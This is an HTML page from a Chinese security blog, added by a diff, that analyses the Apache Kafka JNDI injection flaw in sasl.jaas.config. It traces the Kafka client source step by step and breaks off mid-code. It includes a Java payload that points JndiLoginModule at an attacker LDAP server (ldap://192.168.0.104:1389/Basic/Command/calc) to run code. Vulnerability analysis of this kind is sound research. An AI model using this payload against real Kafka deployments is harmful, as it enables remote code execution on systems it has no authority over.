@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="白给">
+    
+    <title>
+        
+            Kafka命令执行漏洞一 |
+        
+        白给&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/64.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/64.jpg","favicon":"/images/64.jpg","avatar":"/images/64.jpg","font_size":null,"font_family":"STKaiti","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"This is the Way","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["炼气","筑基","结丹","元婴","化神"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/64.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               白给&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Kafka命令执行漏洞一</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/64.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">白给</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-04-24 22:45:18</span>
+        <span class="mobile">2023-04-24 22:45</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-04-24 22:46:12</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.9k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>22 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="一、kafka"><a href="#一、kafka" class="headerlink" title="一、kafka"></a>一、kafka</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Kafka是最初由Linkedin公司开发，是一个分布式、支持分区的（partition）、多副本的（replica），基于zookeeper协调的分布式消息系统，它的最大的特性就是可以实时的处理大量数据以满足各种需求场景：比如基于hadoop的批处理系统、低延迟的实时系统、storm&#x2F;Spark流式处理引擎，web&#x2F;nginx日志、访问日志，消息服务等等，用scala语言编写，Linkedin于2010年贡献给了Apache基金会并成为顶级开源项目。</p>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Kafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，这使它作为企业级基础设施来处理流式数据非常有价值。</p>
+<p>此漏洞允许服务器连接到攻击者的 LDAP 服务器并反序列化 LDAP 响应，攻击者可以使用它在 Kafka 连接服务器上执行 java 反序列化小工具链。当类路径中有小工具时，攻击者可以造成不可信数据的无限制反序列化（或）RCE 漏洞。</p>
+<p>此漏洞利用的前提是：需要访问 Kafka Connect worker，并能够使用任意 Kafka 客户端 SASL JAAS 配置和基于 SASL 的安全协议在其上创建&#x2F;修改连接器。 自 Apache Kafka 2.3.0 以来，这在 Kafka Connect 集群上是可能的。 通过 Kafka Connect REST API 配置连接器时，经过身份验证的操作员可以将连接器的任何 Kafka 客户端的 <code>sasl.jaas.config</code> 属性设置为“com.sun.security.auth.module.JndiLoginModule”，它可以是通过“producer.override.sasl.jaas.config”,“consumer.override.sasl.jaas.config”或“admin.override.sasl.jaas.config”属性完成。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Kafka 2.3.0 - 3.3.2</p>
+<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka-clients<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//高版本JDK(jdk8_191以上)需设置此才可通过ldap进行JNDI注入,低版本JDK不影响</span></span><br><span class="line">    <span class="comment">//高版本科配合JNDI高版本绕过方式</span></span><br><span class="line">    System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">    props.put(<span class="string">&quot;security.protocol&quot;</span>,<span class="string">&quot;SASL_SSL&quot;</span>);</span><br><span class="line">    props.put(<span class="string">&quot;sasl.jaas.config&quot;</span>,<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule &quot;</span> +</span><br><span class="line">            <span class="string">&quot;required user.provider.url=\&quot;ldap://192.168.0.104:1389/Basic/Command/calc\&quot; &quot;</span> +</span><br><span class="line">            <span class="string">&quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot;</span> +</span><br><span class="line">            <span class="string">&quot;group.provider.url=\&quot;xxx\&quot;;&quot;</span>);</span><br><span class="line">    props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">    props.put(<span class="string">&quot;key.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">    props.put(<span class="string">&quot;value.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">    Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(props);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>调试跟进方法</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="/image/kafkaimage-0.png"
+                      alt="img"
+                ></p>
+<p>org.apache.kafka.clients.producer.KafkaProducer构造方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3、调用至此构造方法3</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaProducer</span><span class="params">(Map&lt;String, Object&gt; configs, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">ProducerConfig</span>(ProducerConfig.appendSerializerToConfig(configs, keySerializer, valueSerializer)), keySerializer, valueSerializer, (ProducerMetadata)<span class="literal">null</span>, (KafkaClient)<span class="literal">null</span>, (ProducerInterceptors)<span class="literal">null</span>, Time.SYSTEM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、调用此构造方法1</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaProducer</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>((Properties)properties, (Serializer)<span class="literal">null</span>, (Serializer)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、调用至此构造方法2</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">KafkaProducer</span><span class="params">(Properties properties, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(Utils.propsToMap(properties), keySerializer, valueSerializer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4、最终调用至此构造方法4</span></span><br><span class="line">KafkaProducer(ProducerConfig config, Serializer&lt;K&gt; keySerializer, Serializer&lt;V&gt; valueSerializer, ProducerMetadata metadata, KafkaClient kafkaClient, ProducerInterceptors&lt;K, V&gt; interceptors, Time time) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//以下皆为赋值操作</span></span><br><span class="line">        <span class="built_in">this</span>.producerConfig = config;</span><br><span class="line">        <span class="built_in">this</span>.time = time;</span><br><span class="line">        <span class="type">String</span> <span class="variable">transactionalId</span> <span class="operator">=</span> config.getString(<span class="string">&quot;transactional.id&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.clientId = config.getString(<span class="string">&quot;client.id&quot;</span>);</span><br><span class="line">        LogContext logContext;</span><br><span class="line">        <span class="keyword">if</span> (transactionalId == <span class="literal">null</span>) &#123;</span><br><span class="line">            logContext = <span class="keyword">new</span> <span class="title class_">LogContext</span>(String.format(<span class="string">&quot;[Producer clientId=%s] &quot;</span>, <span class="built_in">this</span>.clientId));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            logContext = <span class="keyword">new</span> <span class="title class_">LogContext</span>(String.format(<span class="string">&quot;[Producer clientId=%s, transactionalId=%s] &quot;</span>, <span class="built_in">this</span>.clientId, transactionalId));</span><br><span class="line">        &#125;</span><br><span class="line">    	......</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.errors = <span class="built_in">this</span>.metrics.sensor(<span class="string">&quot;errors&quot;</span>);</span><br><span class="line">        <span class="comment">//调用newSender()方法</span></span><br><span class="line">        <span class="built_in">this</span>.sender = <span class="built_in">this</span>.newSender(logContext, kafkaClient, <span class="built_in">this</span>.metadata);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ioThreadName</span> <span class="operator">=</span> <span class="string">&quot;kafka-producer-network-thread | &quot;</span> + <span class="built_in">this</span>.clientId;</span><br><span class="line">        <span class="built_in">this</span>.ioThread = <span class="keyword">new</span> <span class="title class_">KafkaThread</span>(ioThreadName, <span class="built_in">this</span>.sender, <span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">this</span>.ioThread.start();</span><br><span class="line">        config.logUnused();</span><br><span class="line">        AppInfoParser.registerAppInfo(<span class="string">&quot;kafka.producer&quot;</span>, <span class="built_in">this</span>.clientId, <span class="built_in">this</span>.metrics, time.milliseconds());</span><br><span class="line">        <span class="built_in">this</span>.log.debug(<span class="string">&quot;Kafka producer started&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var24) &#123;</span><br><span class="line">        <span class="built_in">this</span>.close(Duration.ofMillis(<span class="number">0L</span>), <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">KafkaException</span>(<span class="string">&quot;Failed to construct kafka producer&quot;</span>, var24);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用构造方法1</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-1.png"
+                      alt="img"
+                ></p>
+<p>直至调用至构造方法4</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-2.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-3.png"
+                      alt="img"
+                ></p>
+<p>org.apache.kafka.clients.producer.KafkaProducer#newSender()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-4.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-5.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Sender <span class="title function_">newSender</span><span class="params">(LogContext logContext, KafkaClient kafkaClient, ProducerMetadata metadata)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxInflightRequests</span> <span class="operator">=</span> <span class="built_in">this</span>.producerConfig.getInt(<span class="string">&quot;max.in.flight.requests.per.connection&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">requestTimeoutMs</span> <span class="operator">=</span> <span class="built_in">this</span>.producerConfig.getInt(<span class="string">&quot;request.timeout.ms&quot;</span>);</span><br><span class="line">    <span class="comment">//调用至ClientUtils#createChannelBuilder()</span></span><br><span class="line">    <span class="type">ChannelBuilder</span> <span class="variable">channelBuilder</span> <span class="operator">=</span> ClientUtils.createChannelBuilder(<span class="built_in">this</span>.producerConfig, <span class="built_in">this</span>.time, logContext);</span><br><span class="line">    <span class="type">ProducerMetrics</span> <span class="variable">metricsRegistry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProducerMetrics</span>(<span class="built_in">this</span>.metrics);</span><br><span class="line">    <span class="type">Sensor</span> <span class="variable">throttleTimeSensor</span> <span class="operator">=</span> Sender.throttleTimeSensor(metricsRegistry.senderMetrics);</span><br><span class="line">    <span class="type">KafkaClient</span> <span class="variable">client</span> <span class="operator">=</span> kafkaClient != <span class="literal">null</span> ? kafkaClient : <span class="keyword">new</span> <span class="title class_">NetworkClient</span>(<span class="keyword">new</span> <span class="title class_">Selector</span>(<span class="built_in">this</span>.producerConfig.getLong(<span class="string">&quot;connections.max.idle.ms&quot;</span>), <span class="built_in">this</span>.metrics, <span class="built_in">this</span>.time, <span class="string">&quot;producer&quot;</span>, channelBuilder, logContext), metadata, <span class="built_in">this</span>.clientId, maxInflightRequests, <span class="built_in">this</span>.producerConfig.getLong(<span class="string">&quot;reconnect.backoff.ms&quot;</span>), <span class="built_in">this</span>.producerConfig.getLong(<span class="string">&quot;reconnect.backoff.max.ms&quot;</span>), <span class="built_in">this</span>.producerConfig.getInt(<span class="string">&quot;send.buffer.bytes&quot;</span>), <span class="built_in">this</span>.producerConfig.getInt(<span class="string">&quot;receive.buffer.bytes&quot;</span>), requestTimeoutMs, <span class="built_in">this</span>.producerConfig.getLong(<span class="string">&quot;socket.connection.setup.timeout.ms&quot;</span>), <span class="built_in">this</span>.producerConfig.getLong(<span class="string">&quot;socket.connection.setup.timeout.max.ms&quot;</span>), <span class="built_in">this</span>.time, <span class="literal">true</span>, <span class="built_in">this</span>.apiVersions, throttleTimeSensor, logContext);</span><br><span class="line">    <span class="type">short</span> <span class="variable">acks</span> <span class="operator">=</span> Short.parseShort(<span class="built_in">this</span>.producerConfig.getString(<span class="string">&quot;acks&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Sender</span>(logContext, (KafkaClient)client, metadata, <span class="built_in">this</span>.accumulator, maxInflightRequests == <span class="number">1</span>, <span class="built_in">this</span>.producerConfig.getInt(<span class="string">&quot;max.request.size&quot;</span>), acks, <span class="built_in">this</span>.producerConfig.getInt(<span class="string">&quot;retries&quot;</span>), metricsRegistry.senderMetrics, <span class="built_in">this</span>.time, requestTimeoutMs, <span class="built_in">this</span>.producerConfig.getLong(<span class="string">&quot;retry.backoff.ms&quot;</span>), <span class="built_in">this</span>.transactionManager, <span class="built_in">this</span>.apiVersions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.kafka.clients.ClientUtils#createChannelBuilder()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-6.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ChannelBuilder <span class="title function_">createChannelBuilder</span><span class="params">(AbstractConfig config, Time time, LogContext logContext)</span> &#123;</span><br><span class="line">    <span class="comment">//securityProtocol值为之前security.protocol设置值</span></span><br><span class="line">    <span class="type">SecurityProtocol</span> <span class="variable">securityProtocol</span> <span class="operator">=</span> SecurityProtocol.forName(config.getString(<span class="string">&quot;security.protocol&quot;</span>));</span><br><span class="line">    <span class="type">String</span> <span class="variable">clientSaslMechanism</span> <span class="operator">=</span> config.getString(<span class="string">&quot;sasl.mechanism&quot;</span>);</span><br><span class="line">    <span class="comment">//调用至ChannelBuilders#clientChannelBuilder()</span></span><br><span class="line">    <span class="keyword">return</span> ChannelBuilders.clientChannelBuilder(securityProtocol, Type.CLIENT, config, (ListenerName)<span class="literal">null</span>, clientSaslMechanism, time, <span class="literal">true</span>, logContext);</span><br><span class="line">&#125;之前security.protocol</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.kafka.common.network.ChannelBuilders#clientChannelBuilder()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-7.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ChannelBuilder <span class="title function_">clientChannelBuilder</span><span class="params">(SecurityProtocol securityProtocol, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, String clientSaslMechanism, Time time, <span class="type">boolean</span> saslHandshakeRequestEnable, LogContext logContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (securityProtocol == SecurityProtocol.SASL_PLAINTEXT || securityProtocol == SecurityProtocol.SASL_SSL) &#123;</span><br><span class="line">        <span class="comment">//contextType不为空，不进入</span></span><br><span class="line">        <span class="keyword">if</span> (contextType == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;`contextType` must be non-null if `securityProtocol` is `&quot;</span> + securityProtocol + <span class="string">&quot;`&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//clientSaslMechanism不为空，不进入</span></span><br><span class="line">        <span class="keyword">if</span> (clientSaslMechanism == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;`clientSaslMechanism` must be non-null in client mode if `securityProtocol` is `&quot;</span> + securityProtocol + <span class="string">&quot;`&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用至ChannelBuilders#create()</span></span><br><span class="line">    <span class="keyword">return</span> create(securityProtocol, Mode.CLIENT, contextType, config, listenerName, <span class="literal">false</span>, clientSaslMechanism, saslHandshakeRequestEnable, (CredentialCache)<span class="literal">null</span>, (DelegationTokenCache)<span class="literal">null</span>, time, logContext, (Supplier)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>org.apache.kafka.common.network.ChannelBuilders#create()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-8.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-9.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ChannelBuilder <span class="title function_">create</span><span class="params">(SecurityProtocol securityProtocol, Mode mode, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, <span class="type">boolean</span> isInterBrokerListener, String clientSaslMechanism, <span class="type">boolean</span> saslHandshakeRequestEnable, CredentialCache credentialCache, DelegationTokenCache tokenCache, Time time, LogContext logContext, Supplier&lt;ApiVersionsResponse&gt; apiVersionSupplier)</span> &#123;</span><br><span class="line">    Map&lt;String, Object&gt; configs = channelBuilderConfigs(config, listenerName);</span><br><span class="line">    Object channelBuilder;</span><br><span class="line">    <span class="comment">//securityProtocol为传入security.protocol值</span></span><br><span class="line">    <span class="keyword">switch</span> (securityProtocol) &#123;</span><br><span class="line">        <span class="comment">//security.protocol值为SSL进入   </span></span><br><span class="line">        <span class="keyword">case</span> SSL:</span><br><span class="line">            requireNonNullMode(mode, securityProtocol);</span><br><span class="line">            channelBuilder = <span class="keyword">new</span> <span class="title class_">SslChannelBuilder</span>(mode, listenerName, isInterBrokerListener, logContext);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//security.protocol值为SASL_SSL、SASL_PLAINTEXT进入      </span></span><br><span class="line">        <span class="keyword">case</span> SASL_SSL:</span><br><span class="line">        <span class="keyword">case</span> 